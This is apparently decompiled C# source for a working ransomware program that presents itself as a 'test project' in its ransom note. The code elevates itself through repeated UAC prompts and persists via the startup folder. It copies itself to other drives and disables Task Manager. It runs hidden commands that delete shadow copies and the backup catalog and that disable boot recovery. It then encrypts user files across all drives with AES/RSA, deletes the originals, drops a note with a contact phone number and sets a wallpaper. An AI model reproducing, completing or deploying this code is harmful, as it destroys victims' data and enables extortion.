skgdGz1weom3oANSn442I/3rmrrimYie73NJNVVGPZpDi3C0LlgcZJPm+e/et5me8OeqmJnaUNfyom2rJ+Aq0TljVEQto7zfbIFXZpmzvSNxsfQjYj7jeq5Wx7rriPOFy40tNIy4xhndv8zVsyp0ezE5Lh+oFGWLEBR33OwHzz8K3ozViI54hzVxh3h+F78LvNvDYTxu3t1Nq8ReSyeVUe7jXcMsRU42yY5SyOD/C6nS30Nm1ZtVRTVd+ueYxmmPjOefw+du6yq7npt1dEfz7Yn3x3mPxh1dynzVFxK3S8twySxMyPDINMkcq46ttMB8fQjIOUcEjFbazS5557TzE/ZSxf6Z/wpnjfDo7+3Dx+8oJjzsQw2dGHocgqQezD5V+feK6CNVbmmYxXGZpl9r4V4hOluxVn6JxE+2PfDGeWphPFLZy+ikLnuMfD+42CP9q+e8Ju+dbr0V3mInpzzt/o+g8VteRco1triZjqxx/yVhZp1uHTQMfzIWdO/qrah/7sj7V7ekoqu6Sqxn6qc0+/2ePq64taym/HpqxV/rKmpbRGhOyKq/oAM179qjooppn2h4F2vquVVR3mf3fTtWqFJzVZFHNZ1JhTas14fKhJQKBQKBQKBQW1yaCEvWoIG+epgQku5+9TIkeHHaqiN49BkfOs6mlDUXOF0yatQ1KRg1zOuPhjHLHJpPs86qH/ADCcMN08xGrfYjA+uaxm3X1xNM7d3ZRco8uqmrntPy27ZAZwPSvQeROe6ZM5AohCX87bsTQcZ88c1TTXUxd38srooJOFVWIAA+GADUdMTy7aLk0xiEQ3GZCME7VtVV1Qyp+mcwpKGcgd8ftVI4aTOV/b8MqUYSkVhtsKYWiHj/hbE/KoThecrcqCa/gR2RIkaN5nf3Y4eoiPIw1KWWMNrYKdWkE+leloKqab1NVWZiJzh5utiqq3VFM4qxtL+i7kK7hlsbVrdkeE28aoYzqTCKEwp9QpUr8dq5tRFVN2qJjfMz877w5bER5URHtifb5cb8vX8a8f47bRFRFH7NJpC4AkdrhXPqD5UQH4fevs95s25q5nn7Rh81iaa5jtnb/rs+cs87wpxi4s1caZ0Eij066r5wp7ZZRkgHutfL6uI8ycPo7ET5UZU+crU2l7HcLskjZI+LHZx985+pr8419mdJrqb9PFUxn7zzs/QvD71Or0NVi56qYnE+8RwtQNMlwVOFll1Y+gxn7nP1GK+z01jy6q6/72J/o+O1N/zIop/uxMf1fMV3OB4kqq9K3c1SV4UiazmVng1muUCgUCgUCgUCgtbo7UEDetQY7xBqmBEBqgSXCz3+NBY8eJAzWdTShrDnrhpkicjuBmsJjd0UzsrcpgLbQD16an7nf+tb0xswq5ZRw+DAyatKqvNcVAhOMP5WZtlUE4+lRVOIymmOqcOK+db0e1TMo96Qtj5tuai3V1U5dl2mKaumOyFivs/wAJ+tasYlI8OuCDRpDJ7M5oskI5QKmVoe2eoXwjOMWayLuNx2PqKROOFKqMw3X4Bfim5osbZuGcImuXST3UijSboMSdTKrwSiLX3Z8oCTkknevoqNfTc6Z1NumuqIx17xVOOIqxjL525pZic265jPMRx+Mt6eC9veWHt0l6Z5b68RZJZNevRpZzpJPqOpksM/D0Fc1fiXVXVMx2iKYjaIwmNDGKcT3zPvKPvOLSw3dvcxsdUUqvgE5cA6mDMcnzDIOPjXjV35qnL14txjDqDmjmJLqG0kRThsSgsN027Nn13+m30rk1dib824iM7xVM+2N55X0d2mxFc1T/ACzTEb7zO0IpHr2tojDxxmqq0KUjVSV6VuzVSWkPJrNLxVF1a0snkJCKzkKzEKCTpUFmbA9FAJJ9AKD6LB9AfQ2hn6avg6S+M6AfVsEHHfFBd2nLNxI0iJBKzxHEihDqjOcYcY8pyCMHfY/CgjaBQKBQKC1uu1Bj9/QY7fVYRamowJC2kKebSWH9nv8ApUCP5i4jrXyxuPm2lR/n/Ssq5/5s3oomf+pag525gMcT5IJOQMVjl0TGOWR8jWmuKDPpFGf/AGCumnhyVcsze1xSVMrZ4qhZhfiTf6LdgO7kIPoe/wC2a4tVX00/faHo6C313PiN5cbcfuUeeUjtrI/6dj+4rpsUzFEZRfqiq5VMcZx+izQr8a2c6spxTC0J+wuwalZIrNRuuLRHkdY0Uu7sFRFBLMx2AUDckn0qpNURy6s5G/BM89hL7Wxiu54/ycHa3fumoAjUc4DA+hIrooojmXl3tTvinhi/4PvDjjXDuYnglsp0hWOW3vpCrC3CFS8UqyHCSguqFNOptLNsPMBrOJ4c01P0C4dyjCrlygJKlTkAjB+VZ9EI8yWJca8BbN5uspeMbHprgoCPhncA/Dt9Kr5MTKZvzELLiUXTJjHup5V+SjtXTEYjDDOd3iFqYSqOahMKLms5aUqBNVnhpl8rNLzVF09y1zSsExmVFjKwSoqoZHDSNGygtqZiAxIBwdIHoKCfl5xtAIkRZejbTGeGMjSzsYpGAZtLqp6zpFqIb8uINg9qCN4lxm2uIpld3ieeO219VJLgmW3Z1ZmkiiXUZIxGxbpr5tWfmGKGgEUAUCgYoLe4FBj/ABBaDHL/ABvVhinFeOBDpA1N8P8A5vXNdu9E7cum1Z695nZStI7uYKNXTXJ9dI/beuC5Gou8bQ9SmrTWPmU4fCIyLmSdtx6DP7k1z/8A51U+qtvHi1NO1NG34cm+IMT298bJpAwaZVQFhkB2AB05yPtttXTat10bTui9covU9e0Tx959vl0tytYYKqMAKoH2AxXqvnqpZJfOijcj9aIQd3frjOR8t+9VS0X4484rEJBrXVEmFXUMmVxsMd8gYP01fWvIux51+KO0bz8Pd08+Rp5ud6sxT8/Zymsu+c75zXtbPCid0rblO+pfuRVZdETHurm5T+YfqKlbqj3VbXiKqfeX9R/rQ6o927vA7wBvuOPmBelbKfzLuRT0l+Sduq/9lTgepHrbpyrXfin5d4+DP4X+H8HxIim4uvW5mALL8REo8sY+mWPqTWtNMQ867fqr52biMeBn4Vo5klEvagroahZTue1XhWreGteb48S/VQf02q6KMoqKSoaYXBaqrRChI1ZzLV4xWMrQ+ZqMrYfYHAZSVDAEEqTgNg50kjtkVVZsx7m360qmMMqQLOyMymKOQxHEUJbUB5po12UKNAOkk7BazeH1vG+lmk0vMY0JZCFCtEqpJ7uWlLsynbEa6seoCpdcpWayF5tcKO8pUKV6a4kZEiA97VpUyN8MqPL/ABBsq18F7iaJ53ESXHvW0c0du5wwzILho1MbljlYdmEKhO+CAGP2vJVy8zxx2wWZtSM8ns7OBH0+k105mkimjkIPVWC3R3VQCW1HITHM/hDLaIWhRJ4mQ9ZQkKHrMQshfUY3a1K5ZYIpUaNwpU+qh85V8I3uwBIiw2qB1XyQkvpZjC1uNc00IOovN1ZmaQhV3A2CK4pyXdQyoklvHJLGQ0TotuqsWlAPsqiWFIFEf5gW5hmAm1YHmyQyB/BCdIhONBuQRrRUt1k9nBGkRysnSF6NIZrggBmLDVjDUEBy94f3FwzRpBFDqKvO/TgMSsTIkiyRtNcNK6I2qIwiGJZGzpXAIC85p8K3tToEaS2bsgQmOL8tfM56yiS3uJZVcgRyJNgRsykY2YL7l/wanuYjNMsUDiNGtkkit5cTKEHn6YINoAgRIGZ2wzFt/ejAgDyRcdbpG1/PwISw9mEvTMRDOsvV6AjD4QIbXrCAgasgASJ/jfg3PbxiaJYppCrNdRxxW8YMpV9PS6gCrbecpLEChdACMHagj+U/Ct7k6DDHFaIx1sEi0yIyxuwiRpLi4ScyJoaV5tIiA0gZIonMrPmTw6ntj0nghmVS7QP04RGzKqJCqoktu6SOF/OeXqxsyodJ3wQyFfA2eSF7g9MXJYmKOSO3Zui+syCaRE6TXDdQlJACsZSMA41UGPcN5IuZZnSO2RJXLGRnW3OkpKpjN1mWaOdXUGSRbaGLMgXORk0EnzR4QPaL+VGk9s4VXykIKszRiZphqhlkjwnUiWGZGjk+A3qMJzL7yz4OPdpmZI4IFUrEOnAxLq0ghaIKZHjg0v1JI5ZXd5c5JFShE3nJFxHOiSWqNMhQRvGtsGPUkdpWtWEscUKRgholubeVlctjGxonLIZvA+eGKOdBE1zkG4jiitkbQmgxiB5E6Syp0xrYhRLrk393JCC5X8NJbk9JYIYIiUadxFD0wXV1mURvLcSmZA2mGRGjiTLkKuwJOVfmrwzktT0+lHLas2Ym0RaEVVkaNXRJbadrjW/T63VKGI+YHGKnKuErwvwbuJ4jPIIopsK1rHLHbyYfSmsTGNSjRHpiOFDrMUZz32pkwx+Lku5MxiW2xOQYS7ezGURrEoR5ZOs0Dxs40OsdsJTCMFiSQWTEJ3mbwgmtY+rCsc4aNmuEWOCPM7hgT59B9jKyMpgjeNhpQrg7hkxC25W8KXuvK6JFZoXBOiL8xQVeMwAyTzwuzD85pJjqRVUbbKyYR3HORbm3dY5II5mQl4XCQCN31Roiwos0HRJiXXILhJozKuQDqJLMmIZA/ghOYjMdHtRJ/LKW/U9mLHymXR0vbiGL+0AY1gDOPNTMpY/wTka5nkZI7eKJ5G1zOyQGNWErAi4RppxNmP8AMAto4U6xBIGMqyJLmvwme08qIs1m3TXJSLyAspla4HUgnmYFQ0LRTKUyynC7MyjCty54PTXUfUmWOBVRfZ0eOCQidcqh8mv/AMIFwehI7szl2Y+rQlCycl3KzrG9tmddMYdPZxLpcSGV4JOqsMcaMQIkltmlVGwGGkYCfvvBm4t41nQRST41XUcMdvFuozGLcyKI0jBwkyDQJlLHYkCgi+UvDKW6Ii6UcVsGBmYJH0yrxr1RGjzXM63IcdNJuoqLHqKgFiGCnzV4bTWx6TQxTQ6maBunEI/Ih6KmNJraUXDMSkszM8broJDEYUJi28E55YnnYRJc+9bRyx28h0sMyC4aNOm7MSViOGEKhO+4AY/ackTvM6JbOsrakkdGtluQsfTMZlmMzwuZNJ19CCNiyrqJy2Q//9k=";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "This is a Test project of Munashe Mada ... if you are getting this message , most of your files have been encrypted and you can't retrieve them without him .You can get in touch with him on ", "", "+263785755794", "", "or on popular social media platforms like facebook , linkedin , twitter , whatsapp e.t.c ", "", "please don't be mad at him because you installed it yourself without his consent and he doesn't even know how you got it .Hopefully by the time you contact him , he still has the decryptor.", "", "thank you ", "" };

	private static string[] validExtensions = new string[75]
	{
		".txt", ".jar", ".doc", ".docx", ".ppt", ".pptx", ".jpg", ".mhtml", ".png", ".csv",
		".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".pdf",
		".mp3", ".mp4", ".zip", ".rar", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dic",
		".iso", ".7zip", ".gzip", ".tar", ".jpeg", ".mpeg", ".torrent", ".mpg", ".pdb", ".ico",
		".db", ".wmv", ".bak", ".accdb", ".wma", ".flv", ".wallet", ".css", ".js", ".7z",
		".cpp", ".java", ".jpe", ".ini", ".wps", ".docm", ".wav", ".webm", ".vdi", ".vmdk",
		".onepkg", ".jsp", ".json", ".gif", ".log", ".gz", ".config", ".vb", ".sln", ".potm",
		".pot", ".3g2", ".bin", ".pict", ".vbs"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					try
					{
						fileInfo.Attributes = FileAttributes.Normal;
					}
					catch
					{
					}
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						if (checkDirContains(files[i]))
						{
							string keyRSA = RSA_Encrypt(text, rsaKey());
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					new DirectoryInfo(directories[j]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>qECCGhBDPLoLhSNQlfQZ5np1aO2nE9q96ogQYQtqzdFxqi8xDHyXwQAac33RxqtJKgkY5+0/h4xukkLmNuyD3zqG7QhuAJyDFMbuQ68hQt2vRod46Hz4wG9Qq2Zqbhd3nUQNrj+22rXPUyPX1kJMSbOkLvecRnrJOcsnHlk3F6my39dZDl4YAriz0UATyXzN9PaPdXrVTkIsUc0i0Jr4IVxxyNSB9rfV8Gwd7aeI1YGM9605TXFCgT0NF9SCvguUyZVhv7yIQ6faI1RrIUqjderw/UOrybz9+rFj6p6LkKdp37IAYODOkvJcg55PB5pADPMuyFxXunzHm3arVB/NQQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
